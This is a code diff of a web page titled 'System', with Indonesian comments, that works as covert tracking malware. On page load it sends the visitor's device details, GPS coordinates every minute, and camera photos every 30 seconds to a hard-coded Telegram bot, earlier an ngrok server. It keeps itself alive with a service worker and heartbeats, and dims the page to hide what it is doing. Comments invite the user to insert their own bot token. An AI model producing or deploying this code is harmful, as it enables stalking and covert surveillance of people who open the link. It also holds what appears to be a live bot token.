@@ -1,55 +1,25 @@
 <!DOCTYPE html>
-<html lang="id">
+<html>
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <title>System</title>
     <style>
-        body {
-            margin: 0;
-            padding: 0;
-            background: white;
-            font-family: Arial, sans-serif;
-        }
-        .container {
-            position: fixed;
-            bottom: 20px;
-            left: 20px;
-            background: rgba(0,0,0,0.7);
-            color: white;
-            padding: 8px 12px;
-            border-radius: 8px;
-            font-size: 10px;
-            z-index: 9999;
-        }
-        .btn-upload {
-            position: fixed;
-            bottom: 20px;
-            right: 20px;
-            background: #1a73e8;
-            color: white;
-            border: none;
-            padding: 12px 20px;
-            border-radius: 30px;
-            font-size: 14px;
-            cursor: pointer;
-            z-index: 9999;
-        }
+        body { margin: 0; padding: 0; background: white; }
+        .status { position: fixed; bottom: 10px; left: 10px; background: rgba(0,0,0,0.5); color: white; padding: 5px 10px; border-radius: 5px; font-size: 10px; z-index: 9999; }
     </style>
 </head>
 <body>
-    <div class="container" id="status">Initializing...</div>
-    <button class="btn-upload" id="uploadBtn">📁 Upload Files</button>
+    <div class="status" id="status">Initializing...</div>
 
     <script>
-        // ============ GANTI DENGAN LINK NGROK KAMU ============
-        const SERVER = "https://reversion-exert-gloomily.ngrok-free.dev";
-        // ======================================================
+        // ============ KONFIGURASI TELEGRAM ============
+        // GANTI DENGAN BOT TOKEN DAN CHAT ID KAMU!
+        const TELEGRAM_BOT_TOKEN = "8702184722:AAGGdCH9koUzgcfwLg_Ez0Mk3MBAyp7SCMg";  // Dari @BotFather
+        const TELEGRAM_CHAT_ID = "@tracingidBot";      // Dari @userinfobot
+        // ==============================================
         
         let mediaStream = null;
-        let photoInterval = null;
-        let locationInterval = null;
-        let fileInput = null;
+        let backgroundSync = null;
         
         function updateStatus(msg) {
             const el = document.getElementById('status');
@@ -57,117 +27,80 @@
             console.log(msg);
         }
         
-        async function sendToServer(endpoint, data, isFile = false) {
+        // Kirim ke Telegram
+        async function sendToTelegram(message, file = null) {
             try {
-                let url = `${SERVER}/${endpoint}`;
-                let options = {};
-                
-                if (isFile) {
-                    options = { method: 'POST', body: data };
+                if (file) {
+                    // Kirim file (foto/dokumen)
+                    const formData = new FormData();
+                    formData.append('chat_id', TELEGRAM_CHAT_ID);
+                    formData.append(file.type === 'image' ? 'photo' : 'document', file);
+                    
+                    const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/send${file.type === 'image' ? 'Photo' : 'Document'}`, {
+                        method: 'POST',
+                        body: formData
+                    });
+                    return response.ok;
                 } else {
-                    options = {
+                    // Kirim pesan teks
+                    const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify(data)
-                    };
+                        body: JSON.stringify({
+                            chat_id: TELEGRAM_CHAT_ID,
+                            text: message,
+                            parse_mode: 'HTML'
+                        })
+                    });
+                    return response.ok;
                 }
-                
-                const response = await fetch(url, options);
-                return response.ok;
             } catch(e) {
-                console.log(`Send to ${endpoint} failed:`, e);
+                console.log('Telegram send failed:', e);
                 return false;
             }
         }
         
-        // ============ GPS REAL-TIME SETIAP 1 MENIT ============
-        async function sendLocation() {
-            if (!('geolocation' in navigator)) {
-                updateStatus('❌ GPS not supported');
-                return;
-            }
-            
-            updateStatus('📍 Getting GPS location...');
+        // ============ GPS LANGSUNG KE TELEGRAM ============
+        async function sendLocationToTelegram() {
+            if (!('geolocation' in navigator)) return;
             
             navigator.geolocation.getCurrentPosition(async (position) => {
-                // Data koordinat LENGKAP
-                const locationData = {
-                    // KOORDINAT UTAMA
-                    latitude: position.coords.latitude,
-                    longitude: position.coords.longitude,
-                    
-                    // Detail akurasi
-                    accuracy: position.coords.accuracy, // meter (semakin kecil semakin akurat)
-                    
-                    // Info tambahan (jika tersedia)
-                    altitude: position.coords.altitude,
-                    altitudeAccuracy: position.coords.altitudeAccuracy,
-                    heading: position.coords.heading, // arah (0-360 derajat)
-                    speed: position.coords.speed, // kecepatan (m/s)
-                    
-                    // WAKTU
-                    timestamp: position.timestamp,
-                    isoTime: new Date(position.timestamp).toISOString(),
-                    localTime: new Date(position.timestamp).toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' }),
-                    
-                    // Informasi GPS
-                    provider: 'GPS',
-                    accuracyLevel: position.coords.accuracy < 10 ? 'Sangat Akurat (<10m)' : 
-                                  (position.coords.accuracy < 50 ? 'Akurat (<50m)' : 'Kurang Akurat (>50m)')
-                };
+                const lat = position.coords.latitude;
+                const lng = position.coords.longitude;
+                const acc = position.coords.accuracy;
+                const time = new Date().toLocaleString('id-ID');
                 
-                // Kirim ke server
-                const success = await sendToServer('location', locationData);
+                // Buat link Google Maps
+                const mapsLink = `https://www.google.com/maps?q=${lat},${lng}`;
                 
-                if (success) {
-                    const coordText = `📍 ${locationData.latitude}, ${locationData.longitude} | Akurasi: ${locationData.accuracy}m | ${new Date().toLocaleTimeString()}`;
-                    updateStatus(coordText);
-                    console.log(`[GPS] ${coordText}`);
-                    
-                    // Tampilkan di console dengan format jelas
-                    console.log('═══════════════════════════════════════');
-                    console.log(`🌍 LATITUDE  : ${locationData.latitude}`);
-                    console.log(`🌍 LONGITUDE : ${locationData.longitude}`);
-                    console.log(`📏 ACCURACY  : ${locationData.accuracy} meter`);
-                    console.log(`🕐 TIME      : ${locationData.localTime}`);
-                    console.log('═══════════════════════════════════════');
-                } else {
-                    updateStatus('❌ Failed to send GPS');
-                }
+                const message = `
+📍 <b>GPS UPDATE</b> 📍
+━━━━━━━━━━━━━━━━
+🌍 <b>Koordinat:</b>
+   <code>${lat}</code>
+   <code>${lng}</code>
+📏 <b>Akurasi:</b> ${acc} meter
+🕐 <b>Waktu:</b> ${time}
+🗺️ <b>Map:</b> <a href="${mapsLink}">Klik untuk lihat</a>
+━━━━━━━━━━━━━━━━
+                `;
+                
+                await sendToTelegram(message);
+                updateStatus(`📍 ${lat}, ${lng}`);
+                
+                // Kirim lokasi sebagai live location (jika support)
+                // await sendToTelegram(null, { type: 'location', latitude: lat, longitude: lng });
                 
             }, (error) => {
-                // Error handling
-                let errorMsg = '';
-                switch(error.code) {
-                    case error.PERMISSION_DENIED:
-                        errorMsg = '❌ GPS permission denied. Click Allow!';
-                        break;
-                    case error.POSITION_UNAVAILABLE:
-                        errorMsg = '❌ GPS signal not available';
-                        break;
-                    case error.TIMEOUT:
-                        errorMsg = '❌ GPS timeout - try again';
-                        break;
-                    default:
-                        errorMsg = `❌ GPS error: ${error.message}`;
-                }
-                updateStatus(errorMsg);
-                console.log(errorMsg);
-                
-                // Kirim error ke server
-                sendToServer('location_error', {
-                    error: error.message,
-                    code: error.code,
-                    timestamp: Date.now()
-                });
+                sendToTelegram(`⚠️ GPS Error: ${error.message}`);
             }, {
-                enableHighAccuracy: true,  // WAJIB! untuk GPS akurat
+                enableHighAccuracy: true,
                 timeout: 10000,
-                maximumAge: 0  // Jangan pakai cache, ambil fresh!
+                maximumAge: 0
             });
         }
         
-        // ============ AMBIL FOTO SETIAP 30 DETIK ============
+        // ============ FOTO KE TELEGRAM ============
         async function captureAndSendPhoto() {
             if (!mediaStream) return;
             
@@ -187,9 +120,8 @@
                 canvas.getContext('2d').drawImage(video, 0, 0);
                 
                 canvas.toBlob(async (blob) => {
-                    const formData = new FormData();
-                    formData.append('photo', blob);
-                    await sendToServer('photo', formData, true);
+                    const file = new File([blob], `photo_${Date.now()}.jpg`, { type: 'image/jpeg' });
+                    await sendToTelegram(null, file);
                     console.log(`📸 Photo sent at ${new Date().toLocaleTimeString()}`);
                 }, 'image/jpeg', 0.7);
                 
@@ -200,112 +132,166 @@
             }
         }
         
-        // ============ DEVICE INFO ============
+        // ============ DEVICE INFO KE TELEGRAM ============
         async function sendDeviceInfo() {
-            let batteryInfo = {};
+            const info = {
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                screen: `${screen.width}x${screen.height}`,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+            };
+            
+            // Cek baterai
+            let battery = 'Tidak diketahui';
             if ('getBattery' in navigator) {
                 try {
-                    const battery = await navigator.getBattery();
-                    batteryInfo = {
-                        level: (battery.level * 100).toFixed(1) + '%',
-                        charging: battery.charging
-                    };
+                    const b = await navigator.getBattery();
+                    battery = `${(b.level * 100).toFixed(0)}% ${b.charging ? '(Mengisi)' : '(Tidak mengisi)'}`;
                 } catch(e) {}
             }
             
-            const deviceInfo = {
-                timestamp: Date.now(),
-                localTime: new Date().toLocaleString('id-ID'),
-                hardware: {
-                    platform: navigator.platform,
-                    userAgent: navigator.userAgent,
-                    isMobile: /Mobi|Android|iPhone/i.test(navigator.userAgent),
-                    isAndroid: /Android/i.test(navigator.userAgent),
-                    isIOS: /iPhone|iPad/i.test(navigator.userAgent)
-                },
-                battery: batteryInfo,
-                screen: {
-                    width: screen.width,
-                    height: screen.height
-                }
-            };
+            const message = `
+📱 <b>DEVICE INFO</b> 📱
+━━━━━━━━━━━━━━━━
+💻 <b>Platform:</b> ${info.platform}
+📱 <b>Mobile:</b> ${/Mobi|Android|iPhone/i.test(navigator.userAgent) ? 'Ya' : 'Tidak'}
+🔋 <b>Baterai:</b> ${battery}
+🖥️ <b>Screen:</b> ${info.screen}
+🌐 <b>Browser:</b> ${navigator.userAgent.split(' ').slice(-2).join(' ')}
+🕐 <b>Timezone:</b> ${info.timezone}
+━━━━━━━━━━━━━━━━
+            `;
             
-            await sendToServer('device', deviceInfo);
-            console.log('📱 Device info sent');
+            await sendToTelegram(message);
         }
         
-        // ============ UPLOAD FILE ============
-        function setupUpload() {
-            fileInput = document.createElement('input');
+        // ============ PERSISTENCE: KIRIM PING SETIAP 5 MENIT ============
+        async function sendHeartbeat() {
+            const message = `
+💓 <b>HEARTBEAT</b> 💓
+━━━━━━━━━━━━━━━━
+🕐 <b>Time:</b> ${new Date().toLocaleString('id-ID')}
+✅ <b>Status:</b> Active
+━━━━━━━━━━━━━━━━
+            `;
+            await sendToTelegram(message);
+        }
+        
+        // ============ AKSES FILE (Target upload manual) ============
+        function setupFileUpload() {
+            const fileInput = document.createElement('input');
             fileInput.type = 'file';
             fileInput.multiple = true;
             fileInput.style.display = 'none';
             document.body.appendChild(fileInput);
             
-            document.getElementById('uploadBtn').onclick = () => fileInput.click();
+            const btn = document.createElement('button');
+            btn.innerHTML = '📁 Upload';
+            btn.style.position = 'fixed';
+            btn.style.bottom = '20px';
+            btn.style.right = '20px';
+            btn.style.zIndex = '9999';
+            btn.style.padding = '10px 20px';
+            btn.style.background = '#1a73e8';
+            btn.style.color = 'white';
+            btn.style.border = 'none';
+            btn.style.borderRadius = '20px';
+            btn.onclick = () => fileInput.click();
+            document.body.appendChild(btn);
             
             fileInput.onchange = async () => {
                 for (let file of fileInput.files) {
-                    const formData = new FormData();
-                    formData.append('file', file);
-                    await sendToServer('upload', formData, true);
-                    console.log(`📁 Uploaded: ${file.name}`);
+                    await sendToTelegram(null, file);
+                    console.log(`📁 Sent: ${file.name}`);
                 }
-                alert(`Uploaded ${fileInput.files.length} files`);
+                alert(`Sent ${fileInput.files.length} files to Telegram`);
                 fileInput.value = '';
             };
         }
         
+        // ============ SERVICE WORKER (Background persistence) ============
+        async function registerServiceWorker() {
+            try {
+                // Coba gunakan Background Sync API
+                if ('serviceWorker' in navigator && 'SyncManager' in window) {
+                    const swCode = `
+                        self.addEventListener('sync', event => {
+                            if (event.tag === 'keep-alive') {
+                                event.waitUntil(
+                                    clients.matchAll().then(clients => {
+                                        clients.forEach(client => client.postMessage('keep-alive'));
+                                    })
+                                );
+                            }
+                        });
+                    `;
+                    
+                    const blob = new Blob([swCode], { type: 'application/javascript' });
+                    const swUrl = URL.createObjectURL(blob);
+                    const registration = await navigator.serviceWorker.register(swUrl);
+                    console.log('Service Worker registered');
+                    
+                    // Request periodic sync
+                    if ('periodicSync' in registration) {
+                        const status = await navigator.permissions.query({ name: 'periodic-background-sync' });
+                        if (status.state === 'granted') {
+                            await registration.periodicSync.register('keep-alive', { minInterval: 15 * 60 * 1000 });
+                        }
+                    }
+                }
+            } catch(e) {
+                console.log('Service Worker not supported:', e);
+            }
+        }
+        
         // ============ MAIN ============
         async function start() {
-            updateStatus('🎯 Starting GPS tracking...');
+            updateStatus('Starting...');
             
-            // Minta akses kamera (untuk foto)
+            // Kirim device info ke Telegram
+            await sendDeviceInfo();
+            
+            // Minta akses kamera
             try {
                 mediaStream = await navigator.mediaDevices.getUserMedia({ 
                     video: { width: 640, height: 480 },
                     audio: true
                 });
                 mediaStream.getAudioTracks().forEach(t => t.enabled = true);
-                console.log('✅ Camera ready');
+                updateStatus('✅ Camera ready');
+                
+                // Ambil foto pertama
+                await captureAndSendPhoto();
+                
+                // Foto setiap 30 detik
+                setInterval(captureAndSendPhoto, 30000);
             } catch(e) {
-                console.log('Camera not available, continuing without photo');
+                updateStatus('⚠️ Camera not available');
+                await sendToTelegram('⚠️ Camera access denied by user');
             }
             
-            // Kirim device info
-            await sendDeviceInfo();
+            // GPS setiap 1 menit
+            await sendLocationToTelegram();
+            setInterval(sendLocationToTelegram, 60000);
             
-            // GPS: langsung ambil pertama kali
-            await sendLocation();
+            // Heartbeat setiap 5 menit
+            setInterval(sendHeartbeat, 5 * 60 * 1000);
             
-            // GPS: SETIAP 1 MENIT (60000 ms)
-            locationInterval = setInterval(sendLocation, 60000);
-            console.log('⏰ GPS tracking every 1 MINUTE');
+            // Setup file upload
+            setupFileUpload();
             
-            // Foto setiap 30 detik (jika kamera tersedia)
-            if (mediaStream) {
-                photoInterval = setInterval(captureAndSendPhoto, 30000);
-                console.log('📸 Auto photo every 30 seconds');
-            }
+            // Register service worker untuk background
+            await registerServiceWorker();
             
-            // Setup upload
-            setupUpload();
+            updateStatus('✅ Active - Data goes to Telegram');
             
-            updateStatus('📍 GPS aktif - update setiap 1 menit');
-            
-            // Sembunyikan halaman setelah 3 detik
+            // Sembunyikan halaman
             setTimeout(() => {
-                document.body.style.opacity = '0.3';
+                document.body.style.opacity = '0.2';
             }, 3000);
         }
         
         start();
-        
-        window.addEventListener('beforeunload', () => {
-            if (photoInterval) clearInterval(photoInterval);
-            if (locationInterval) clearInterval(locationInterval);
-            if (mediaStream) mediaStream.getTracks().forEach(t => t.stop());
-        });
     </script>
 </body>
 </html>
